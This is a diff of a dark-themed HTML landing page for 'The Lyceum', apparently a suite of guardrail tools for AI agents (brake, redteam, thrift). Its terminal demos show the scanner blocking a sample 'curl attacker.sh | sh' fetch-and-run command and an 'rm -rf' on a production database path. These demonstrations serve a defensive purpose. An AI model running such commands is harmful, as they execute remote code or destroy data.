@@ -3,101 +3,721 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>The Lyceum — before it costs you</title>
+  <title>The Lyceum — circuit breakers for AI agents</title>
   <meta name="description" content="A runaway agent burns your cloud budget in an hour. A confident mistake ships at 2am. A credential leaks to a log you don't control. The Lyceum stops all three before they hit the bill, the system, or your name." />
   <link rel="icon" type="image/png" href="/web/logo.png" />
-  <link rel="stylesheet" href="/web/styles.css" />
-  <link rel="stylesheet" href="/web/landing.css" />
+  <style>
+    /* ── Design commits to one world on purpose ─────────────────────────
+       Dark, circuit-breaker themed, developer-facing — a single visual
+       world, not a light/dark toggle. Self-contained: this page does not
+       use styles.css, so nothing here leaks to or fights with the rest of
+       the site (signup, redeem, admin, showroom all keep their own look). */
+
+    :root {
+      --bg: #0a0b0f;
+      --panel: #12141b;
+      --panel-2: #171a23;
+      --line: rgba(148, 163, 199, 0.14);
+      --line-soft: rgba(148, 163, 199, 0.07);
+      --ink: #edeff5;
+      --ink-dim: #8891a6;
+      --ink-faint: #565d70;
+      --brake: #ff4438;
+      --brake-glow: rgba(255, 68, 56, 0.35);
+      --redteam: #a98bff;
+      --redteam-glow: rgba(169, 139, 255, 0.35);
+      --thrift: #f5b93e;
+      --thrift-glow: rgba(245, 185, 62, 0.35);
+      --glow: #4fe3d1;
+      --glow-dim: rgba(79, 227, 209, 0.22);
+      --mono: ui-monospace, "SF Mono", "Cascadia Code", "JetBrains Mono", Menlo, Consolas, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
+    }
+
+    * { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--ink);
+      font-family: var(--sans);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+    }
+
+    #trace-bg {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .page { position: relative; z-index: 1; }
+
+    a { color: inherit; }
+
+    ::selection { background: var(--glow-dim); color: var(--ink); }
+
+    /* ── Chrome ─────────────────────────────────────────────────────── */
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+      padding: 16px 5vw;
+      border-bottom: 1px solid var(--line);
+      backdrop-filter: blur(10px);
+      background: rgba(10, 11, 15, 0.72);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: var(--mono);
+      font-weight: 600;
+      font-size: 15px;
+      letter-spacing: 0.02em;
+      text-decoration: none;
+      color: var(--ink);
+    }
+    .logo-img { height: 30px; width: auto; display: block; border-radius: 6px; }
+    .nav { display: flex; gap: 28px; font-family: var(--mono); font-size: 13px; color: var(--ink-dim); }
+    .nav a { text-decoration: none; transition: color 0.15s ease; }
+    .nav a:hover { color: var(--ink); }
+    .nav-cta {
+      border: 1px solid var(--line);
+      padding: 8px 16px;
+      border-radius: 3px;
+      color: var(--ink) !important;
+      font-family: var(--mono);
+      font-size: 13px;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+    .nav-cta:hover { border-color: var(--glow); color: var(--glow) !important; }
+
+    main { max-width: 1120px; margin: 0 auto; padding: 0 5vw; }
+
+    /* ── Hero ───────────────────────────────────────────────────────── */
+
+    .hero {
+      padding: 88px 0 64px;
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      gap: 56px;
+      align-items: center;
+    }
+
+    .eyebrow {
+      font-family: var(--mono);
+      font-size: 12px;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--glow);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 22px;
+    }
+    .eyebrow::before {
+      content: "";
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--glow);
+      box-shadow: 0 0 8px 1px var(--glow);
+    }
+
+    .hero h1 {
+      font-family: var(--mono);
+      font-size: clamp(34px, 4.4vw, 56px);
+      line-height: 1.06;
+      letter-spacing: -0.02em;
+      font-weight: 600;
+      margin: 0 0 22px;
+      text-wrap: balance;
+    }
+    .hero h1 .dim { color: var(--ink-faint); }
+    .hero h1 .hl { color: var(--brake); }
+
+    .hero p.lede {
+      font-size: 17px;
+      color: var(--ink-dim);
+      max-width: 46ch;
+      margin: 0 0 32px;
+    }
+    .hero p.lede strong { color: var(--ink); font-weight: 600; }
+
+    .hero-ctas { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+    .btn {
+      font-family: var(--mono);
+      font-size: 13.5px;
+      font-weight: 600;
+      padding: 13px 22px;
+      border-radius: 3px;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      border: 0;
+      cursor: pointer;
+    }
+    .btn-primary {
+      background: var(--brake);
+      color: #fff0ee;
+      box-shadow: 0 0 0 1px rgba(255, 68, 56, 0.4), 0 8px 24px -8px var(--brake-glow);
+    }
+    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 0 0 1px rgba(255, 68, 56, 0.6), 0 12px 28px -8px var(--brake-glow); }
+    .btn-ghost { color: var(--ink-dim); border: 1px solid var(--line); background: transparent; }
+    .btn-ghost:hover { color: var(--ink); border-color: var(--ink-faint); }
+
+    /* ── Terminal window ───────────────────────────────────────────── */
+
+    .term {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 30px 60px -30px rgba(0, 0, 0, 0.7), 0 0 60px -20px var(--glow-dim);
+    }
+    .term-head {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 11px 14px;
+      background: var(--panel-2);
+      border-bottom: 1px solid var(--line);
+    }
+    .term-dot { width: 9px; height: 9px; border-radius: 50%; }
+    .term-dot.r { background: #ff5f57; }
+    .term-dot.y { background: #febc2e; }
+    .term-dot.g { background: #28c840; }
+    .term-title {
+      margin-left: 6px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--ink-faint);
+    }
+    .term-body {
+      padding: 20px 22px;
+      font-family: var(--mono);
+      font-size: 12.8px;
+      line-height: 1.85;
+      min-height: 210px;
+    }
+    .term-body .prompt { color: var(--glow); }
+    .term-body .cmd { color: var(--ink); }
+    .term-body .out { color: var(--ink-dim); }
+    .term-body .ok { color: #6bd98f; }
+    .term-body .warn { color: var(--thrift); }
+    .term-body .danger { color: var(--brake); font-weight: 600; }
+    .term-body .caret {
+      display: inline-block;
+      width: 7px; height: 14px;
+      background: var(--glow);
+      margin-left: 2px;
+      vertical-align: -2px;
+      animation: blink 1s steps(1) infinite;
+    }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* ── Breaker panel ──────────────────────────────────────────────── */
+
+    .section { padding: 84px 0; }
+    .section-head { margin-bottom: 44px; }
+    .section-label {
+      font-family: var(--mono);
+      font-size: 11.5px;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--ink-faint);
+      margin-bottom: 10px;
+    }
+    .section-title {
+      font-family: var(--mono);
+      font-size: clamp(24px, 2.6vw, 32px);
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      color: var(--ink);
+      max-width: 26ch;
+      text-wrap: balance;
+    }
+
+    .breakers { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; }
+    .breaker {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 26px 24px 24px;
+      position: relative;
+      overflow: hidden;
+    }
+    .breaker::before {
+      content: "";
+      position: absolute; inset: 0 0 auto 0; height: 2px;
+      background: var(--b-color);
+      box-shadow: 0 0 16px 1px var(--b-glow);
+    }
+    .breaker.brake { --b-color: var(--brake); --b-glow: var(--brake-glow); }
+    .breaker.redteam { --b-color: var(--redteam); --b-glow: var(--redteam-glow); }
+    .breaker.thrift { --b-color: var(--thrift); --b-glow: var(--thrift-glow); }
+
+    .breaker-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+    .breaker-name {
+      font-family: var(--mono);
+      font-size: 17px;
+      font-weight: 650;
+      color: var(--ink);
+    }
+    .led {
+      width: 9px; height: 9px; border-radius: 50%;
+      background: var(--b-color);
+      box-shadow: 0 0 9px 1px var(--b-glow);
+    }
+    .breaker-role {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--b-color);
+      margin-bottom: 14px;
+    }
+    .breaker-desc { font-size: 13.5px; color: var(--ink-dim); line-height: 1.65; margin-bottom: 20px; min-height: 84px; }
+    .breaker-cmd {
+      font-family: var(--mono);
+      font-size: 11.8px;
+      color: var(--ink-faint);
+      background: var(--bg);
+      border: 1px solid var(--line-soft);
+      border-radius: 4px;
+      padding: 10px 12px;
+      overflow-x: auto;
+      white-space: pre;
+    }
+    .breaker-cmd .p { color: var(--b-color); }
+
+    /* ── Dashboard demo ────────────────────────────────────────────── */
+
+    .demo-grid {
+      display: grid;
+      grid-template-columns: 0.85fr 1.15fr;
+      gap: 48px;
+      align-items: center;
+    }
+    .demo-copy p { color: var(--ink-dim); font-size: 15px; max-width: 42ch; margin: 0 0 16px; }
+    .demo-copy p strong { color: var(--ink); }
+    .stat-row { display: flex; gap: 28px; margin-top: 28px; flex-wrap: wrap; }
+    .stat { font-family: var(--mono); }
+    .stat .n { font-size: 26px; font-weight: 650; color: var(--ink); font-variant-numeric: tabular-nums; }
+    .stat .l { font-size: 11px; color: var(--ink-faint); text-transform: uppercase; letter-spacing: 0.06em; margin-top: 2px; }
+
+    .bar-track { display: flex; height: 8px; border-radius: 4px; overflow: hidden; background: var(--panel-2); width: 100%; }
+    .bar-fill { height: 100%; }
+
+    /* ── Stakes ────────────────────────────────────────────────────── */
+
+    .stakes { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; }
+    .stake {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-left: 2px solid var(--s-color);
+      border-radius: 6px;
+      padding: 22px 22px 24px;
+    }
+    .stake.money { --s-color: var(--brake); }
+    .stake.ops { --s-color: var(--thrift); }
+    .stake.trust { --s-color: var(--redteam); }
+    .stake-tag {
+      font-family: var(--mono);
+      font-size: 10.5px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--s-color);
+      margin-bottom: 10px;
+    }
+    .stake h3 { font-size: 16px; font-weight: 650; margin: 0 0 14px; color: var(--ink); }
+    .stake blockquote {
+      margin: 0;
+      padding-top: 14px;
+      border-top: 1px solid var(--line);
+      font-size: 13px;
+      color: var(--ink-dim);
+      font-style: italic;
+      line-height: 1.6;
+    }
+
+    /* ── Benchmark strip ───────────────────────────────────────────── */
+
+    .bench-strip {
+      display: flex;
+      justify-content: space-between;
+      gap: 20px;
+      padding: 28px 0;
+      border-top: 1px solid var(--line);
+      border-bottom: 1px solid var(--line);
+      flex-wrap: wrap;
+    }
+    .bench-item { font-family: var(--mono); }
+    .bench-item .v { font-size: 21px; font-weight: 650; font-variant-numeric: tabular-nums; }
+    .bench-item.brake .v { color: var(--brake); }
+    .bench-item.redteam .v { color: var(--redteam); }
+    .bench-item.thrift .v { color: var(--thrift); }
+    .bench-item .l { font-size: 11px; color: var(--ink-faint); margin-top: 3px; }
+
+    /* ── CTA ───────────────────────────────────────────────────────── */
+
+    .cta { text-align: center; padding: 96px 0 110px; }
+    .cta h2 {
+      font-family: var(--mono);
+      font-size: clamp(26px, 3vw, 38px);
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      margin: 0 0 14px;
+      text-wrap: balance;
+    }
+    .cta p { color: var(--ink-dim); font-size: 15px; margin: 0 0 34px; }
+    .cta-term { max-width: 480px; margin: 0 auto; text-align: left; }
+
+    footer {
+      text-align: center;
+      padding: 34px 5vw 48px;
+      color: var(--ink-faint);
+      font-family: var(--mono);
+      font-size: 12px;
+      border-top: 1px solid var(--line);
+    }
+
+    @media (max-width: 860px) {
+      .hero { grid-template-columns: 1fr; padding-top: 56px; }
+      .breakers { grid-template-columns: 1fr; }
+      .demo-grid { grid-template-columns: 1fr; }
+      .stakes { grid-template-columns: 1fr; }
+      .nav { display: none; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .term-body .caret { animation: none; }
+    }
+  </style>
 </head>
 <body>
+
+<canvas id="trace-bg"></canvas>
+
+<div class="page">
+
   <header class="topbar">
-    <div class="brand">
+    <a class="brand" href="/">
       <img src="/web/logo.png" alt="The Lyceum" class="logo-img" />
-      <span class="name">The Lyceum</span>
-    </div>
+      THE LYCEUM
+    </a>
     <nav class="nav">
-      <a href="/web/redeem" class="nav-cta">Enter license key</a>
+      <a href="#breakers">Products</a>
+      <a href="#dashboard">Status</a>
     </nav>
+    <a class="nav-cta" href="/web/redeem">Enter license key</a>
   </header>
 
   <main>
-    <!-- ── The fear, stated plainly. This page's only two jobs: say who we
-         are, and get an application. Everything else — pricing, live
-         benchmarks, setup guides — lives on its own page. ────────────── -->
+
+    <!-- ── Hero: the thesis — a live terminal, not a hero image ────────── -->
     <section class="hero">
-      <p class="eyebrow">Circuit breakers for AI agents</p>
-      <h1>Your agent will fail.<br />The question is what it costs you.</h1>
-      <p class="lede">
-        A runaway loop burns your cloud budget in an hour. A confident
-        answer ships wrong at 2 a.m. A credential leaks to a log you don't
-        control. <strong>Nothing stops it — until something does.</strong>
-      </p>
-      <p class="lede-sub">
-        The Lyceum sits between your agents and those outcomes — three
-        tools, every single tool call, on the hot path.
-      </p>
+      <div>
+        <div class="eyebrow">Circuit breakers for AI agents</div>
+        <h1>Your agent<br>will fail.<br><span class="hl">The question</span><br><span class="dim">is what it costs you.</span></h1>
+        <p class="lede">
+          A runaway loop burns your cloud budget in an hour. A confident answer ships wrong at 2&nbsp;a.m.
+          A credential leaks to a log you don't control. <strong>Nothing stops it — until something does.</strong>
+        </p>
+        <div class="hero-ctas">
+          <a class="btn btn-primary" href="/web/signup">Create account →</a>
+          <a class="btn btn-ghost" href="#breakers">See the three tools</a>
+        </div>
+      </div>
+
+      <div class="term" id="term-install">
+        <div class="term-head">
+          <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+          <span class="term-title">zsh — install &amp; activate</span>
+        </div>
+        <div class="term-body" data-typer></div>
+      </div>
     </section>
 
-    <section id="stakes">
-      <div class="stakes-grid">
-        <div class="stake-card money">
-          <span class="stake-tag">Financial loss</span>
+    <!-- ── Three breakers ────────────────────────────────────────────── -->
+    <section class="section" id="breakers">
+      <div class="section-head">
+        <div class="section-label">01 — the panel</div>
+        <div class="section-title">Three switches. One pool of tools your agents can't trip on their own.</div>
+      </div>
+      <div class="breakers">
+        <div class="breaker brake">
+          <div class="breaker-top"><span class="breaker-name">brake</span><span class="led"></span></div>
+          <div class="breaker-role">stops the action</div>
+          <div class="breaker-desc">Scans a planned action before it runs — data exfiltration, destructive commands, credential leaks. Blocks in under 1000ms, every call, on the hot path.</div>
+          <div class="breaker-cmd"><span class="p">$</span> brake scan "rm -rf /var/db/production"</div>
+        </div>
+        <div class="breaker redteam">
+          <div class="breaker-top"><span class="breaker-name">redteam</span><span class="led"></span></div>
+          <div class="breaker-role">stops the argument</div>
+          <div class="breaker-desc">Challenges a one-sided conclusion before it ships — unsupported claims, confirmation bias, missing counter-evidence. Nine flaw classes, warn or block.</div>
+          <div class="breaker-cmd"><span class="p">$</span> redteam challenge "this migration is safe"</div>
+        </div>
+        <div class="breaker thrift">
+          <div class="breaker-top"><span class="breaker-name">thrift</span><span class="led"></span></div>
+          <div class="breaker-role">stops the bill</div>
+          <div class="breaker-desc">Deduplicates and compresses tool output before it re-enters context — lossless first, truncation only as a last resort. Trips a runaway loop at 2 repeats.</div>
+          <div class="breaker-cmd"><span class="p">$</span> thrift measure . --passes 5</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── Benchmark strip ───────────────────────────────────────────── -->
+    <div class="bench-strip">
+      <div class="bench-item brake"><div class="v">1.45M/sec</div><div class="l">brake — cloud throughput</div></div>
+      <div class="bench-item redteam"><div class="v">295.3k/sec</div><div class="l">redteam — cloud throughput</div></div>
+      <div class="bench-item thrift"><div class="v">47.5k/sec</div><div class="l">thrift — cloud throughput</div></div>
+      <div class="bench-item"><div class="v" style="color:var(--ink)">274/274</div><div class="l">tests passing</div></div>
+    </div>
+
+    <!-- ── Dashboard demo ────────────────────────────────────────────── -->
+    <section class="section" id="dashboard">
+      <div class="demo-grid">
+        <div class="demo-copy">
+          <div class="section-label">02 — measured, not promised</div>
+          <div class="section-title" style="margin-bottom:18px;">One command tells you exactly what it caught.</div>
+          <p><code style="font-family:var(--mono);color:var(--glow)">lyceum status</code> reads each tool's own local log — <strong>not a marketing dashboard</strong> — and prints what actually happened on your machine.</p>
+          <div class="stat-row">
+            <div class="stat"><div class="n" style="color:var(--brake)">3</div><div class="l">blocked</div></div>
+            <div class="stat"><div class="n">$7.50</div><div class="l">saved</div></div>
+            <div class="stat"><div class="n" style="color:var(--thrift)">52.2%</div><div class="l">tokens cut</div></div>
+          </div>
+        </div>
+
+        <div class="term">
+          <div class="term-head">
+            <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+            <span class="term-title">zsh — lyceum status</span>
+          </div>
+          <div class="term-body">
+<div><span class="prompt">$</span> <span class="cmd">lyceum status</span></div>
+<div>&nbsp;</div>
+<div class="out">● <span style="color:var(--brake);font-weight:600">brake</span>    7 event(s) logged</div>
+<div class="out">&nbsp;&nbsp;3 blocked · 500,130 tokens saved · $7.50 saved</div>
+<div>&nbsp;</div>
+<div class="out">● <span style="color:var(--redteam);font-weight:600">redteam</span>  33 challenge(s) logged</div>
+<div class="out">&nbsp;&nbsp;17 blocked of 33</div>
+<div>&nbsp;</div>
+<div class="out">● <span style="color:var(--thrift);font-weight:600">thrift</span>   45 compression(s) logged</div>
+<div class="out">&nbsp;&nbsp;before 10,538 → after 5,034 tokens</div>
+<div style="margin:6px 0;">
+  <div class="bar-track"><div class="bar-fill" style="width:52.2%; background:linear-gradient(90deg,var(--thrift),var(--glow));"></div></div>
+</div>
+<div class="ok">&nbsp;&nbsp;52.2% saved<span class="caret"></span></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── Stakes ────────────────────────────────────────────────────── -->
+    <section class="section">
+      <div class="section-head">
+        <div class="section-label">03 — what it costs when nothing stops it</div>
+        <div class="section-title">Three ways an unguarded agent turns into an incident.</div>
+      </div>
+      <div class="stakes">
+        <div class="stake money">
+          <div class="stake-tag">Financial loss</div>
           <h3>The bill nobody saw coming</h3>
-          <div class="stake-line">"We were burning $4,000/hour and the agent was stuck on a 500."</div>
+          <blockquote>"We were burning $4,000/hour and the agent was stuck on a 500."</blockquote>
         </div>
-        <div class="stake-card ops">
-          <span class="stake-tag">Operational collapse</span>
+        <div class="stake ops">
+          <div class="stake-tag">Operational collapse</div>
           <h3>The confident crash</h3>
-          <div class="stake-line">"It said it was sure. The on-call page said otherwise."</div>
+          <blockquote>"It said it was sure. The on-call page said otherwise."</blockquote>
         </div>
-        <div class="stake-card trust">
-          <span class="stake-tag">Reputational damage</span>
+        <div class="stake trust">
+          <div class="stake-tag">Reputational damage</div>
           <h3>The leak you find out about last</h3>
-          <div class="stake-line">"We didn't know it had been copied until the audit."</div>
+          <blockquote>"We didn't know it had been copied until the audit."</blockquote>
         </div>
       </div>
     </section>
 
-    <section id="products">
-      <div class="products products--compact">
-        <div class="product-mini">
-          <span class="dot red"></span>
-          <span class="product-mini-name">brake</span>
-          <span class="product-mini-role">stops the action</span>
+    <!-- ── CTA ───────────────────────────────────────────────────────── -->
+    <section class="cta" id="cta">
+      <h2>Install it before you need it.</h2>
+      <p>One command. No repo to clone. brake, redteam, and thrift, all three.</p>
+      <div class="term cta-term">
+        <div class="term-head">
+          <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+          <span class="term-title">any blank terminal</span>
         </div>
-        <div class="product-mini">
-          <span class="dot violet"></span>
-          <span class="product-mini-name">redteam</span>
-          <span class="product-mini-role">stops the argument</span>
+        <div class="term-body" style="min-height:auto;">
+          <div><span class="prompt">$</span> <span class="cmd">npm install -g the-lyceum</span></div>
+          <div class="out" style="margin-top:6px;">added 94 packages<span class="caret"></span></div>
         </div>
-        <div class="product-mini">
-          <span class="dot amber"></span>
-          <span class="product-mini-name">thrift</span>
-          <span class="product-mini-role">stops the bill</span>
-        </div>
+      </div>
+      <div class="hero-ctas" style="justify-content:center; margin-top:24px;">
+        <a class="btn btn-primary" href="/web/signup">Create your account →</a>
+        <a class="btn btn-ghost" href="/web/redeem">Already have a key? Enter it here</a>
       </div>
     </section>
 
-    <!-- ── Create account ──────────────────────────────────────────── -->
-    <section id="get-started" class="book-a-call-section">
-      <a href="/web/signup" class="book-a-call-cta" style="display:inline-block; text-decoration:none;">
-        Create your account
-      </a>
-      <a href="/web/redeem" class="license-cta">Already have a key? Enter it here</a>
-    </section>
-
-    <!-- ── Benchmark ────────────────────────────────────────────────── -->
-    <section id="benchmark" class="benchmark-section">
-      <h2 class="section-title">Measured, not promised</h2>
-      <p class="section-sub">
-        Real test runs, real cloud hardware (GitHub Actions, x64 + arm64) — not simulated.
-      </p>
-      <img src="/web/benchmark-chart.svg" alt="The Lyceum benchmark: brake 1.45M calls/sec, redteam 295.3k calls/sec, thrift 47.5k calls/sec, all well above their CI floors; 274/274 tests passing." class="benchmark-chart" />
-    </section>
   </main>
 
-  <footer>
-    <p>brake stops the action, redteam attacks the argument, thrift stops the bill.</p>
-  </footer>
+  <footer>brake stops the action · redteam attacks the argument · thrift stops the bill</footer>
+
+</div>
+
+<script>
+  // ── Ambient circuit-trace canvas ──────────────────────────────────
+  (function () {
+    const canvas = document.getElementById("trace-bg");
+    const ctx = canvas.getContext("2d");
+    const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+    let w, h, dpr;
+    let nodes = [];
+    const COLORS = ["#ff4438", "#a98bff", "#f5b93e", "#4fe3d1"];
+
+    function resize() {
+      dpr = Math.min(window.devicePixelRatio || 1, 2);
+      w = window.innerWidth;
+      h = document.documentElement.scrollHeight;
+      canvas.width = w * dpr;
+      canvas.height = h * dpr;
+      canvas.style.width = w + "px";
+      canvas.style.height = h + "px";
+      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+      buildNodes();
+    }
+
+    function buildNodes() {
+      const cols = Math.max(6, Math.round(w / 170));
+      const rows = Math.max(4, Math.round(h / 220));
+      nodes = [];
+      for (let i = 0; i < cols; i++) {
+        for (let j = 0; j < rows; j++) {
+          if (Math.random() > 0.6) continue;
+          nodes.push({
+            x: (i + 0.5) * (w / cols) + (Math.random() - 0.5) * 40,
+            y: (j + 0.5) * (h / rows) + (Math.random() - 0.5) * 40,
+            color: COLORS[Math.floor(Math.random() * COLORS.length)],
+            phase: Math.random() * Math.PI * 2,
+            r: 1.2 + Math.random() * 1.6,
+          });
+        }
+      }
+    }
+
+    function dist(a, b) { return Math.hypot(a.x - b.x, a.y - b.y); }
+
+    function draw(t) {
+      ctx.clearRect(0, 0, w, h);
+      ctx.strokeStyle = "rgba(148,163,199,0.06)";
+      ctx.lineWidth = 1;
+      for (let i = 0; i < nodes.length; i++) {
+        for (let j = i + 1; j < nodes.length; j++) {
+          const d = dist(nodes[i], nodes[j]);
+          if (d < 220) {
+            ctx.beginPath();
+            ctx.moveTo(nodes[i].x, nodes[i].y);
+            ctx.lineTo(nodes[j].x, nodes[i].y);
+            ctx.lineTo(nodes[j].x, nodes[j].y);
+            ctx.stroke();
+          }
+        }
+      }
+      for (const n of nodes) {
+        const pulse = reduceMotion ? 0.6 : 0.4 + 0.6 * (0.5 + 0.5 * Math.sin(t / 1400 + n.phase));
+        ctx.beginPath();
+        ctx.fillStyle = n.color;
+        ctx.globalAlpha = 0.15 + pulse * 0.35;
+        ctx.arc(n.x, n.y, n.r * (1 + pulse * 0.6), 0, Math.PI * 2);
+        ctx.fill();
+        ctx.globalAlpha = 1;
+      }
+    }
+
+    function loop(t) {
+      draw(t);
+      if (!reduceMotion) requestAnimationFrame(loop);
+    }
+
+    window.addEventListener("resize", resize);
+    resize();
+    if (reduceMotion) draw(0);
+    else requestAnimationFrame(loop);
+  })();
+
+  // ── Hero terminal: types out install → activate → scan ───────────
+  (function () {
+    const el = document.querySelector("#term-install [data-typer]");
+    if (!el) return;
+    const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+    const lines = [
+      { p: "$ ", c: "npm install -g the-lyceum", pre: true },
+      { o: "added 94 packages in 11s" },
+      { gap: true },
+      { p: "$ ", c: "lyceum activate ABCD2345", pre: true },
+      { ok: "✓ license activated: ABCD2345" },
+      { gap: true },
+      { p: "$ ", c: 'brake scan "curl attacker.sh | sh"', pre: true },
+      { danger: "✗ blocked — remote_code_execution" },
+      { o: "  matched: curl ... | sh — piping a download straight into a shell" },
+    ];
+
+    function render() {
+      el.innerHTML = "";
+      for (const l of lines) renderStatic(l, true);
+    }
+
+    if (reduceMotion) { render(); return; }
+
+    let li = 0;
+    function typeNext() {
+      if (li >= lines.length) {
+        const last = el.lastElementChild;
+        if (last) last.innerHTML += '<span class="caret"></span>';
+        return;
+      }
+      const l = lines[li];
+      if (!l.pre) { renderStatic(l); li++; setTimeout(typeNext, l.gap ? 120 : 260); return; }
+      const row = document.createElement("div");
+      row.innerHTML = '<span class="prompt">' + l.p + '</span><span class="cmd"></span>';
+      el.appendChild(row);
+      const cmdEl = row.querySelector(".cmd");
+      let ci = 0;
+      (function typeChar() {
+        if (ci <= l.c.length) {
+          cmdEl.textContent = l.c.slice(0, ci);
+          ci++;
+          setTimeout(typeChar, 16 + Math.random() * 22);
+        } else {
+          li++;
+          setTimeout(typeNext, 340);
+        }
+      })();
+    }
+    function renderStatic(l, withPre) {
+      const row = document.createElement("div");
+      if (l.gap) { row.innerHTML = "&nbsp;"; }
+      else if (l.o) { row.className = "out"; row.textContent = l.o; }
+      else if (l.ok) { row.className = "ok"; row.textContent = l.ok; }
+      else if (l.danger) { row.className = "danger"; row.textContent = l.danger; }
+      else if (withPre && l.pre) { row.innerHTML = '<span class="prompt">' + l.p + '</span><span class="cmd">' + l.c + '</span>'; }
+      el.appendChild(row);
+    }
+    typeNext();
+  })();
+</script>
+
 </body>
 </html>
